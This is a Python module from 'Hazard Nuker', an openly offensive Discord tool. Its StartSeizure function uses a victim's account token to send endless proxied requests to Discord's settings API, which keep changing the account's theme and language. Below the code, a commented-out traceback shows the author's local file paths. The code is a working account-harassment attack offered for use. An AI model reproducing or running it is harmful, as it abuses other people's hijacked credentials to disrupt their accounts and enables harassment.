# Hazard was proudly coded by Rdimo (https://github.com/Rdimo).
# Copyright (c) 2021 Rdimo#6969 | https://Cheataway.com
# Hazard Nuker under the GNU General Public Liscense v2 (1991).

import requests
import random

from util.plugins.common import getheaders, proxy

def StartSeizure(token):
    while True:
        setting = {'theme': random.choice(['dark', 'light']), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
        requests.patch("https://discord.com/api/v7/users/@me/settings", proxies=proxy(), headers=getheaders(token), json=setting)

# Process Process-2:
# Process Process-1:
# Traceback (most recent call last):
#   File "C:\Users\Rasmus\AppData\Local\Programs\Python\Python310\lib\multiprocessing\process.py", line 315, in _bootstrap
#     self.run()
# Traceback (most recent call last):
#   File "C:\Users\Rasmus\AppData\Local\Programs\Python\Python310\lib\multiprocessing\process.py", line 315, in _bootstrap
#     self.run()
#   File "C:\Users\Rasmus\AppData\Local\Programs\Python\Python310\lib\multiprocessing\process.py", line 108, in run
#     self._target(*self._args, **self._kwargs)
#   File "C:\Users\Rasmus\OneDrive\Skrivbord\Projects\GitHub\Hazard-Nuker\util\seizure.py", line 13, in StartSeizure
#     requests.patch("https://discord.com/api/v7/users/@me/settings", proxies=proxy(), headers=getheaders(token), json=setting)
#   File "C:\Users\Rasmus\OneDrive\Skrivbord\Projects\GitHub\Hazard-Nuker\util\plugins\common.py", line 473, in proxy
#     fp.truncate()
#   File "C:\Users\Rasmus\AppData\Local\Programs\Python\Python310\lib\multiprocessing\process.py", line 108, in run
#     self._target(*self._args, **self._kwargs)
# Traceback (most recent call last):
# io.UnsupportedOperation: truncate
#   File "C:\Users\Rasmus\OneDrive\Skrivbord\Projects\GitHub\Hazard-Nuker\util\seizure.py", line 13, in StartSeizure
#     requests.patch("https://discord.com/api/v7/users/@me/settings", proxies=proxy(), headers=getheaders(token), json=setting)
#   File "C:\Users\Rasmus\AppData\Local\Programs\Python\Python310\lib\multiprocessing\process.py", line 315, in _bootstrap
#     self.run()
#   File "C:\Users\Rasmus\OneDrive\Skrivbord\Projects\GitHub\Hazard-Nuker\util\plugins\common.py", line 473, in proxy
#     fp.truncate()
#   File "C:\Users\Rasmus\AppData\Local\Programs\Python\Python310\lib\multiprocessing\process.py", line 108, in run
#     self._target(*self._args, **self._kwargs)
# io.UnsupportedOperation: truncate
#   File "C:\Users\Rasmus\OneDrive\Skrivbord\Projects\GitHub\Hazard-Nuker\util\seizure.py", line 13, in StartSeizure
#     requests.patch("https://discord.com/api/v7/users/@me/settings", proxies=proxy(), headers=getheaders(token), json=setting)
#   File "C:\Users\Rasmus\OneDrive\Skrivbord\Projects\GitHub\Hazard-Nuker\util\plugins\common.py", line 473, in proxy
#     fp.truncate()
# io.UnsupportedOperation: truncate